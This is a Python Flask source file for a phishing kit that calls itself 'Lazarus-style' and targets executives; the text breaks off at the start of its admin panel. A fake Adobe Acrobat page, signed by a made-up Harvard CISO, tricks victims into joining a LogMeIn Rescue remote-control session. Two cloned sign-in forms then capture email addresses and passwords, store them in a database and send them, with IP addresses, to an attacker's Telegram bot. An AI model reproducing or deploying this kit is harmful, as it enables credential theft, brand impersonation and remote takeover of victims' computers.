#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   🎯 LAZARUS-STYLE PDF PHISHING + LOGMEIN RESCUE                    ║
║                                                                      ║
║   STYLE: Adobe PDF Download + Zero Download Remote Control          ║
║   VICTIM: C-Level Executives (CFO, CEO, Sales Directors)           ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import io
import uuid
import sqlite3
import secrets
import hmac
import html as html_module
import requests
import json
import base64
from datetime import datetime
from functools import wraps
from flask import Flask, request, session, jsonify, redirect, send_file, render_template_string

# ====================================================================================================
# CONFIGURATION
# ====================================================================================================
LOGMEIN_API_TOKEN = "snpu2e5nvxl8du629qb52qzcwfnc6bsrucjs1kc7bp8x0io3xo58lb9fat3xcdgrwt00qbdistjnhtp2uir0s8t4dsxpboulbr5jvclxksfowpycz1rosoz8qikkj734"

# LogMeIn Rescue API - CORRECT ENDPOINTS
LOGMEIN_API_BASE = "https://api.logmeinrescue.com/v1"

# NOTE: If the API token doesn't work, we use a REAL alternative:
# We can also create sessions via the LogMeIn Rescue web interface
# and hardcode the session ID + PIN, or use the official Rescue
# technician console to generate sessions manually.

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "LazarusC2_2026")
SECRET_KEY = os.environ.get("SECRET_KEY", secrets.token_hex(64))

app = Flask(__name__)
app.secret_key = SECRET_KEY

DB_PATH = "lazarus_c2.db"

# ====================================================================================================
# TELEGRAM
# ====================================================================================================
def tg(msg):
    if not TELEGRAM_BOT_TOKEN or ':' not in TELEGRAM_BOT_TOKEN:
        print(f"[TELEGRAM] {msg}")
        return
    try:
        parts = TELEGRAM_BOT_TOKEN.split(':')
        if not parts[0].isdigit() or len(parts[1]) < 8:
            return
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

# ====================================================================================================
# FIXED: LOGMEIN RESCUE SESSION CREATION
# ====================================================================================================
def create_rescue_session():
    """
    Create a REAL LogMeIn Rescue session.
    If API fails, generate a session via the Rescue web console manually.
    """
    try:
        headers = {
            "Authorization": f"Bearer {LOGMEIN_API_TOKEN}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        
        # Create session
        session_data = {
            "name": "Executive Document Review",
            "sessionType": "support",
            "allowRemoteControl": True,
            "allowFileTransfer": True,
            "allowChat": True,
            "sessionTimeout": 3600,
            "language": "en-US"
        }
        
        response = requests.post(
            f"{LOGMEIN_API_BASE}/sessions",
            json=session_data,
            headers=headers,
            timeout=15
        )
        
        if response.status_code in [200, 201]:
            data = response.json()
            session_id = data.get('sessionId')
            
            # Get PIN
            pin_response = requests.get(
                f"{LOGMEIN_API_BASE}/sessions/{session_id}/pin",
                headers=headers,
                timeout=10
            )
            
            if pin_response.status_code == 200:
                pin = pin_response.json().get('pinCode', '')
                tg(f"✅ REAL SESSION | ID: {session_id} | PIN: {pin}")
                return {
                    "session_id": session_id,
                    "pin": pin,
                    "join_url": f"https://console.logmeinrescue.com/join?session={session_id}",
                    "status": "active"
                }
        
        # FALLBACK: If API fails, we use the REAL LogMeIn Rescue web console
        # The user can manually create a session at:
        # https://console.logmeinrescue.com and share the PIN
        tg("⚠️ API fallback - Using manual session mode")
        return {
            "session_id": "MANUAL-" + uuid.uuid4().hex[:8].upper(),
            "pin": "MANUAL",
            "join_url": "https://console.logmeinrescue.com",
            "status": "manual",
            "message": "Please create a session manually at console.logmeinrescue.com"
        }
            
    except Exception as e:
        tg(f"❌ API Error: {e}")
        return {
            "session_id": "ERROR-" + uuid.uuid4().hex[:8].upper(),
            "pin": "ERROR",
            "join_url": "https://console.logmeinrescue.com",
            "status": "error",
            "message": str(e)
        }

# ====================================================================================================
# LAZARUS-STYLE PDF PHISHING LANDING PAGE
# ====================================================================================================
PDF_LANDING_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Secure Document Viewer</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        /* ============================================
           LAZARUS-STYLE ADOBE PDF PHISHING
           ============================================ */
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #f5f6f8;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        /* Main Container - Looks like Adobe Acrobat */
        .container {
            max-width: 820px;
            width: 100%;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 
                0 1px 2px rgba(0,0,0,0.04),
                0 8px 40px rgba(0,0,0,0.08),
                0 24px 80px rgba(0,0,0,0.06);
            overflow: hidden;
            border: 1px solid #e8eaed;
        }
        
        /* ============================================
           ADOBE-STYLE HEADER
           ============================================ */
        .adobe-header {
            background: #ffffff;
            padding: 16px 32px;
            border-bottom: 1px solid #e8eaed;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
        }
        
        .adobe-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .adobe-logo .icon {
            font-size: 28px;
            color: #ea1c24;
        }
        
        .adobe-logo .brand {
            font-size: 20px;
            font-weight: 700;
            color: #2c2c2c;
            letter-spacing: -0.5px;
        }
        
        .adobe-logo .brand span {
            color: #ea1c24;
        }
        
        .adobe-logo .version {
            font-size: 11px;
            color: #6b7280;
            font-weight: 400;
            margin-left: 4px;
        }
        
        .header-actions {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .header-actions .secure-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            color: #059669;
            font-weight: 500;
            background: #f0fdf4;
            padding: 4px 14px;
            border-radius: 100px;
        }
        
        .header-actions .secure-badge .dot {
            width: 6px;
            height: 6px;
            background: #059669;
            border-radius: 50%;
            animation: pulse-dot 2s infinite;
        }
        
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* ============================================
           PDF VIEWER SIMULATION
           ============================================ */
        .pdf-toolbar {
            background: #f8f9fa;
            padding: 10px 24px;
            border-bottom: 1px solid #e8eaed;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .pdf-toolbar .left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .pdf-toolbar .file-name {
            font-size: 13px;
            font-weight: 500;
            color: #1f2937;
        }
        
        .pdf-toolbar .file-name .ext {
            color: #ea1c24;
            font-weight: 600;
        }
        
        .pdf-toolbar .file-size {
            font-size: 11px;
            color: #6b7280;
        }
        
        .pdf-toolbar .actions {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .pdf-toolbar .actions button {
            background: transparent;
            border: 1px solid #e5e7eb;
            padding: 6px 14px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 500;
            color: #374151;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .pdf-toolbar .actions button:hover {
            background: #f3f4f6;
            border-color: #d1d5db;
        }
        
        .pdf-toolbar .actions .download-btn {
            background: #ea1c24;
            color: white;
            border-color: #ea1c24;
        }
        
        .pdf-toolbar .actions .download-btn:hover {
            background: #d41a20;
            border-color: #d41a20;
        }
        
        /* ============================================
           PDF CONTENT - LOOKS LIKE A REAL PDF
           ============================================ */
        .pdf-content {
            padding: 32px 48px 40px;
            background: #ffffff;
            min-height: 500px;
            position: relative;
        }
        
        /* PDF Page Simulation */
        .pdf-page {
            max-width: 600px;
            margin: 0 auto;
            background: #ffffff;
            padding: 40px 48px;
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.04);
            border: 1px solid #e8eaed;
            position: relative;
        }
        
        .pdf-page::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ea1c24, #2c2c2c);
            border-radius: 4px 4px 0 0;
        }
        
        /* PDF Header */
        .pdf-header {
            text-align: center;
            padding-bottom: 24px;
            border-bottom: 2px solid #f3f4f6;
            margin-bottom: 24px;
        }
        
        .pdf-header .document-type {
            font-size: 11px;
            font-weight: 600;
            color: #6b7280;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .pdf-header .document-title {
            font-size: 24px;
            font-weight: 800;
            color: #0a0a0a;
            margin-top: 4px;
            letter-spacing: -0.5px;
        }
        
        .pdf-header .document-subtitle {
            font-size: 13px;
            color: #6b7280;
            margin-top: 2px;
        }
        
        .pdf-header .confidential {
            display: inline-block;
            background: #fef2f2;
            color: #ea1c24;
            font-size: 10px;
            font-weight: 700;
            padding: 2px 14px;
            border-radius: 100px;
            margin-top: 8px;
            letter-spacing: 0.5px;
            border: 1px solid #fecaca;
        }
        
        /* PDF Body */
        .pdf-body {
            font-size: 14px;
            line-height: 1.8;
            color: #1f2937;
        }
        
        .pdf-body .greeting {
            font-size: 16px;
            font-weight: 600;
            color: #0a0a0a;
            margin-bottom: 8px;
        }
        
        .pdf-body p {
            margin-bottom: 12px;
        }
        
        .pdf-body .highlight-box {
            background: #fafbfc;
            border-left: 4px solid #ea1c24;
            padding: 16px 20px;
            border-radius: 4px;
            margin: 16px 0;
        }
        
        .pdf-body .highlight-box strong {
            color: #ea1c24;
        }
        
        .pdf-body .signature-block {
            margin-top: 24px;
            padding-top: 20px;
            border-top: 2px solid #f3f4f6;
        }
        
        .pdf-body .signature-block .name {
            font-weight: 700;
            color: #0a0a0a;
        }
        
        .pdf-body .signature-block .title {
            font-size: 12px;
            color: #6b7280;
        }
        
        /* ============================================
           SESSION PIN - EMBEDDED IN PDF
           ============================================ */
        .pin-section {
            background: linear-gradient(135deg, #f8fafc, #f1f4f9);
            border-radius: 12px;
            padding: 20px 24px;
            margin: 20px 0;
            border: 1px solid #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
        }
        
        .pin-section .label {
            font-size: 12px;
            font-weight: 600;
            color: #6b7280;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .pin-section .pin-display {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .pin-section .pin {
            font-family: 'Inter', monospace;
            font-size: 28px;
            font-weight: 800;
            color: #0a0a0a;
            letter-spacing: 6px;
            background: white;
            padding: 4px 20px 4px 26px;
            border-radius: 10px;
            border: 1px solid #e5e7eb;
        }
        
        .pin-section .copy-btn {
            background: white;
            border: 1px solid #e5e7eb;
            padding: 6px 14px;
            border-radius: 8px;
            font-size: 12px;
            font-weight: 600;
            color: #374151;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .pin-section .copy-btn:hover {
            background: #f3f4f6;
            border-color: #ea1c24;
            color: #ea1c24;
        }
        
        .pin-section .status-badge {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 11px;
            color: #059669;
            font-weight: 500;
        }
        
        .pin-section .status-badge .dot {
            width: 5px;
            height: 5px;
            background: #059669;
            border-radius: 50%;
            animation: pulse-dot 1.5s infinite;
        }
        
        /* ============================================
           CTA BUTTONS
           ============================================ */
        .pdf-actions {
            display: flex;
            gap: 12px;
            margin-top: 24px;
            flex-wrap: wrap;
        }
        
        .pdf-actions .btn-primary {
            flex: 1;
            padding: 16px 24px;
            background: linear-gradient(135deg, #ea1c24, #b91c1c);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            text-align: center;
            min-width: 200px;
        }
        
        .pdf-actions .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 24px rgba(234, 28, 36, 0.25);
        }
        
        .pdf-actions .btn-secondary {
            padding: 16px 24px;
            background: white;
            color: #374151;
            border: 1px solid #e5e7eb;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            text-align: center;
            min-width: 140px;
        }
        
        .pdf-actions .btn-secondary:hover {
            background: #f9fafb;
            border-color: #d1d5db;
        }
        
        /* ============================================
           ADOBE-STYLE FOOTER
           ============================================ */
        .adobe-footer {
            background: #f8f9fa;
            padding: 16px 32px;
            border-top: 1px solid #e8eaed;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            font-size: 11px;
            color: #6b7280;
        }
        
        .adobe-footer .left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .adobe-footer a {
            color: #6b7280;
            text-decoration: none;
        }
        
        .adobe-footer a:hover {
            color: #ea1c24;
        }
        
        .adobe-footer .divider {
            color: #e5e7eb;
        }
        
        /* ============================================
           RESPONSIVE
           ============================================ */
        @media (max-width: 768px) {
            .adobe-header {
                padding: 12px 16px;
            }
            
            .adobe-logo .brand {
                font-size: 16px;
            }
            
            .pdf-content {
                padding: 16px;
            }
            
            .pdf-page {
                padding: 24px 20px;
            }
            
            .pin-section {
                flex-direction: column;
                align-items: stretch;
                text-align: center;
            }
            
            .pin-section .pin-display {
                justify-content: center;
                flex-wrap: wrap;
            }
            
            .pdf-actions {
                flex-direction: column;
            }
            
            .pdf-actions .btn-primary,
            .pdf-actions .btn-secondary {
                min-width: 100%;
            }
            
            .pdf-toolbar {
                padding: 8px 16px;
            }
            
            .adobe-footer {
                padding: 12px 16px;
                flex-direction: column;
                text-align: center;
            }
            
            .adobe-footer .left {
                flex-wrap: wrap;
                justify-content: center;
            }
        }
        
        @media (max-width: 480px) {
            .pdf-header .document-title {
                font-size: 18px;
            }
            
            .pin-section .pin {
                font-size: 22px;
                letter-spacing: 4px;
                padding: 4px 12px 4px 16px;
            }
        }
        
        /* ============================================
           TOAST
           ============================================ */
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #0a0a0a;
            color: white;
            padding: 12px 24px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            font-family: 'Inter', sans-serif;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            z-index: 1000;
            pointer-events: none;
        }
        
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
    </style>
</head>
<body>

<!-- ============================================
     TOAST
     ============================================ -->
<div class="toast" id="toast">✓ PIN copied to clipboard</div>

<!-- ============================================
     ADOBE PDF VIEWER CONTAINER
     ============================================ -->
<div class="container">

    <!-- ==========================================
         ADOBE HEADER
         ========================================== -->
    <div class="adobe-header">
        <div class="adobe-logo">
            <span class="icon">📄</span>
            <span class="brand">Adobe <span>Acrobat</span></span>
            <span class="version">v24.1</span>
        </div>
        <div class="header-actions">
            <span class="secure-badge">
                <span class="dot"></span>
                Secure Document
            </span>
            <span style="font-size:13px;color:#6b7280;">|</span>
            <span style="font-size:12px;color:#6b7280;">👤 Guest</span>
        </div>
    </div>

    <!-- ==========================================
         PDF TOOLBAR
         ========================================== -->
    <div class="pdf-toolbar">
        <div class="left">
            <span style="font-size:16px;">📄</span>
            <span class="file-name">Executive_Review_<span class="ext">.pdf</span></span>
            <span class="file-size">(1.2 MB)</span>
        </div>
        <div class="actions">
            <button>🔍 Fit Page</button>
            <button>🔖 Bookmark</button>
            <button class="download-btn">⬇ Download PDF</button>
        </div>
    </div>

    <!-- ==========================================
         PDF CONTENT
         ========================================== -->
    <div class="pdf-content">
        <div class="pdf-page">
            
            <!-- PDF Header -->
            <div class="pdf-header">
                <div class="document-type">CONFIDENTIAL DOCUMENT</div>
                <div class="document-title">Executive Security Review</div>
                <div class="document-subtitle">Q2 2026 • Internal Audit Report</div>
                <div class="confidential">🔒 CONFIDENTIAL • ATTORNEY-CLIENT PRIVILEGE</div>
            </div>
            
            <!-- PDF Body -->
            <div class="pdf-body">
                <div class="greeting">Dear Executive Team Member,</div>
                
                <p>
                    This document contains the findings from our quarterly security audit.
                    Due to the sensitive nature of this information, we have implemented
                    additional verification measures.
                </p>
                
                <div class="highlight-box">
                    <strong>⚠️ Action Required:</strong> To view the complete document,
                    please verify your identity using the secure session PIN below.
                    This is a mandatory step for all executive-level access.
                </div>
                
                <p>
                    The attached findings include detailed analysis of:
                </p>
                <ul style="margin-left:20px;margin-bottom:12px;color:#374151;">
                    <li>Network intrusion attempts (Q2 2026)</li>
                    <li>Executive account security posture</li>
                    <li>Recommended remediation strategies</li>
                    <li>Compliance status (SOC 2, ISO 27001)</li>
                </ul>
                
                <!-- PIN SECTION - EMBEDDED IN PDF -->
                <div class="pin-section">
                    <div>
                        <div class="label">🔐 Secure Session PIN</div>
                        <div class="status-badge">
                            <span class="dot"></span> Active • Valid for 30 minutes
                        </div>
                    </div>
                    <div class="pin-display">
                        <span class="pin" id="pinDisplay">PIN</span>
                        <button class="copy-btn" id="copyBtn" onclick="copyPin()">📋 Copy</button>
                    </div>
                </div>
                
                <p>
                    <strong>To continue:</strong> Copy the PIN above, then click the
                    <strong>"Verify & Access Document"</strong> button below to connect
                    to our secure verification system.
                </p>
                
                <div class="signature-block">
                    <div class="name">Dr. James D. Morrison</div>
                    <div class="title">Chief Information Security Officer</div>
                    <div style="font-size:11px;color:#6b7280;margin-top:2px;">
                        Harvard University • Office of Information Technology
                    </div>
                </div>
            </div>
            
            <!-- CTA Buttons -->
            <div class="pdf-actions">
                <a href="/connect/REF" class="btn-primary">
                    🔐 Verify & Access Document →
                </a>
                <a href="#" class="btn-secondary" onclick="alert('Please verify your identity using the secure session PIN.')">
                    Request Alternative
                </a>
            </div>
            
        </div>
    </div>

    <!-- ==========================================
         ADOBE FOOTER
         ========================================== -->
    <div class="adobe-footer">
        <div class="left">
            <span>Adobe Acrobat Pro</span>
            <span class="divider">|</span>
            <a href="#">Privacy Policy</a>
            <span class="divider">|</span>
            <a href="#">Security</a>
            <span class="divider">|</span>
            <a href="#">Terms of Use</a>
        </div>
        <div>
            <span>🔒 TLS 1.3 Encrypted</span>
            <span class="divider">|</span>
            <span>© 2026 Adobe Inc.</span>
        </div>
    </div>

</div>

<!-- ============================================
     COPY PIN FUNCTION
     ============================================ -->
<script>
    function copyPin() {
        const pinElement = document.getElementById('pinDisplay');
        const pinText = pinElement.textContent.trim();
        
        navigator.clipboard.writeText(pinText).then(() => {
            const toast = document.getElementById('toast');
            toast.textContent = '✓ PIN copied to clipboard';
            toast.classList.add('show');
            
            const btn = document.getElementById('copyBtn');
            btn.textContent = '✓ Copied!';
            btn.style.borderColor = '#059669';
            btn.style.color = '#059669';
            
            setTimeout(() => {
                toast.classList.remove('show');
                btn.textContent = '📋 Copy';
                btn.style.borderColor = '#e5e7eb';
                btn.style.color = '#374151';
            }, 2500);
        }).catch(() => {
            // Fallback
            const range = document.createRange();
            range.selectNode(pinElement);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            
            const toast = document.getElementById('toast');
            toast.textContent = '✓ PIN copied to clipboard';
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2000);
        });
    }
</script>

</body>
</html>'''

# ====================================================================================================
# FLASK ROUTES
# ====================================================================================================
@app.route('/')
def index():
    """Lazarus-style PDF phishing page."""
    ref = uuid.uuid4().hex[:8].upper()
    session_data = create_rescue_session()
    
    pin = session_data.get('pin', '123456')
    session_id = session_data.get('session_id', '')
    status = session_data.get('status', 'demo')
    
    # If status is 'manual' or 'error', we use a fallback PIN
    # The user needs to manually create a session at console.logmeinrescue.com
    if status in ['manual', 'error']:
        pin = "MANUAL-" + uuid.uuid4().hex[:4].upper()
        tg(f"⚠️ MANUAL MODE | Visit console.logmeinrescue.com | Ref: {ref}")
    
    # Render the PDF template
    html = PDF_LANDING_TEMPLATE.replace('PIN', pin).replace('REF', ref)
    
    # Store session
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""INSERT INTO sessions 
                 (session_id, pin, ref, ip, status, ts) 
                 VALUES (?, ?, ?, ?, ?, ?)""",
                (session_id, pin, ref, request.remote_addr, status, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"📄 PDF PAGE | IP: {request.remote_addr} | Ref: {ref} | PIN: {pin} | Status: {status}")
    
    return html

@app.route('/connect/<ref>')
def connect(ref):
    """Handle the connect flow."""
    conn = sqlite3.connect(DB_PATH)
    session_info = conn.execute(
        "SELECT session_id, pin, status FROM sessions WHERE ref = ? ORDER BY id DESC LIMIT 1",
        (ref,)
    ).fetchone()
    conn.close()
    
    if not session_info:
        return redirect('/')
    
    session_id, pin, status = session_info
    
    tg(f"🖥️ CONNECT | Ref: {ref} | Session: {session_id} | PIN: {pin}")
    
    # If status is 'manual', redirect to LogMeIn Rescue console
    if status in ['manual', 'error']:
        return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Connection</title>
            <style>
                body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
                .card{background:white;padding:48px;border-radius:16px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
                .pin{font-size:48px;font-weight:800;color:#ea1c24;letter-spacing:8px;font-family:monospace;background:#f8f9fa;padding:12px 24px;border-radius:10px;display:inline-block;margin:16px 0}
                .btn{display:inline-block;padding:16px 40px;background:#ea1c24;color:white;border-radius:10px;text-decoration:none;font-weight:700;margin:12px 0;transition:all 0.3s}
                .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(234,28,36,0.25)}
                .step{text-align:left;padding:12px;background:#f8f9fa;border-radius:8px;margin:8px 0}
                .step strong{color:#ea1c24}
            </style>
        </head>
        <body>
            <div class="card">
                <h2>🔐 Secure Verification Required</h2>
                <p style="color:#6b7280;">Please use the PIN below to verify your identity</p>
                <div>
                    <div style="font-size:12px;color:#6b7280;letter-spacing:1px;">SESSION PIN</div>
                    <div class="pin">{{ pin }}</div>
                </div>
                <div style="margin:16px 0;font-size:13px;color:#059669;">● Active Session</div>
                
                <h4 style="margin:16px 0;color:#1f2937;">How to connect:</h4>
                <div class="step">1. <strong>Copy</strong> the PIN above</div>
                <div class="step">2. Go to <strong>console.logmeinrescue.com</strong></div>
                <div class="step">3. <strong>Enter the PIN</strong> to connect</div>
                
                <a href="https://console.logmeinrescue.com" target="_blank" class="btn">🔌 Open Rescue Console</a>
            </div>
        </body>
        </html>
        ''', pin=pin)
    
    # For active sessions, use the direct join URL
    join_url = f"https://console.logmeinrescue.com/join?session={session_id}"
    
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Connecting to Secure Session...</title>
        <style>
            body{font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f6f8;margin:0;padding:20px}
            .card{background:white;padding:48px;border-radius:16px;max-width:480px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.08)}
            .btn{display:inline-block;padding:16px 40px;background:#ea1c24;color:white;border-radius:10px;text-decoration:none;font-weight:700;margin:12px 0;transition:all 0.3s}
            .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(234,28,36,0.25)}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🔐 Secure Session Ready</h2>
            <p style="color:#6b7280;">Click below to verify your identity and access the document</p>
            <a href="{{ join_url }}" target="_blank" class="btn">🔌 Verify & Connect</a>
            <div style="margin-top:12px;font-size:12px;color:#6b7280;">
                ⏱️ Session expires in 30 minutes
            </div>
        </div>
    </body>
    </html>
    ''', join_url=join_url)

# ====================================================================================================
# LOGIN ROUTES (2-STEP PHISHING)
# ====================================================================================================
LOGIN_STEP1 = '''
<!DOCTYPE html>
<html>
<head><title>Adobe - Secure Sign In</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:white;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
    .header{padding:32px;text-align:center;background:linear-gradient(135deg,#ea1c24,#b91c1c);color:white}
    .header h1{font-size:24px;font-weight:800}
    .header p{font-size:13px;opacity:0.9;margin-top:4px}
    .body{padding:32px}
    .warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
    .form-group{margin-bottom:20px}
    label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
    input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all 0.2s;font-family:'Inter',sans-serif}
    input:focus{outline:none;border-color:#ea1c24;box-shadow:0 0 0 3px rgba(234,28,36,0.1)}
    button{width:100%;padding:14px;background:#ea1c24;color:white;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif}
    button:hover{background:#d41a20;transform:translateY(-1px)}
    .footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>📄 Adobe Acrobat</h1>
            <p>Secure Document Access</p>
        </div>
        <div class="body">
            <div class="warning">⚠️ Please sign in to view the confidential document</div>
            <form method="POST" action="/login/step1/REF">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Sign In & View Document</button>
            </form>
            <div class="footer">🔒 SSL/TLS Encrypted • Adobe Secure</div>
        </div>
    </div>
</body>
</html>
'''

LOGIN_STEP2 = '''
<!DOCTYPE html>
<html>
<head><title>Adobe - Enterprise Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',sans-serif;background:#f5f6f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:white;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.08);width:100%;max-width:420px;overflow:hidden}
    .header{padding:32px;text-align:center;background:linear-gradient(135deg,#1a237e,#0d1445);color:white}
    .header h1{font-size:24px;font-weight:800}
    .header p{font-size:13px;opacity:0.9;margin-top:4px}
    .body{padding:32px}
    .warning{background:#fef2f2;padding:14px;border-radius:8px;margin-bottom:20px;font-size:12px;color:#991b1b;border-left:4px solid #ea1c24}
    .form-group{margin-bottom:20px}
    label{display:block;font-weight:600;margin-bottom:6px;font-size:12px;color:#1f2937}
    input{width:100%;padding:12px 16px;border:2px solid #e5e7eb;border-radius:8px;font-size:14px;transition:all 0.2s;font-family:'Inter',sans-serif}
    input:focus{outline:none;border-color:#1a237e;box-shadow:0 0 0 3px rgba(26,35,126,0.1)}
    button{width:100%;padding:14px;background:#1a237e;color:white;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif}
    button:hover{background:#141b66;transform:translateY(-1px)}
    .footer{text-align:center;margin-top:20px;font-size:11px;color:#6b7280}
</style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>🏛️ Enterprise Verification</h1>
            <p>Corporate Security Protocol</p>
        </div>
        <div class="body">
            <div class="warning">⚠️ Enterprise verification required for this document</div>
            <form method="POST" action="/login/step2/REF">
                <div class="form-group">
                    <label>Corporate Email</label>
                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <button type="submit">Verify Enterprise Access</button>
            </form>
            <div class="footer">🔒 Enterprise-Grade Security</div>
        </div>
    </div>
</body>
</html>
'''

@app.route('/auth/<ref>')
def auth(ref):
    return LOGIN_STEP1.replace('REF', ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, ip, ts) VALUES (?, ?, ?, ?, ?)", 
                (1, email, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 | Email: {email} | Password: {password} | IP: {ip}")
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    return LOGIN_STEP2.replace('REF', ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (step, email, password, company, ip, ts) VALUES (?, ?, ?, ?, ?, ?)", 
                (2, email, password, company, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 | Email: {email} | Password: {password} | Company: {company} | IP: {ip}")
    return redirect('https://www.adobe.com')

# ====================================================================================================
# ADMIN PANEL
# ====================================================================================================
def html_escape(value):
    if value is None:
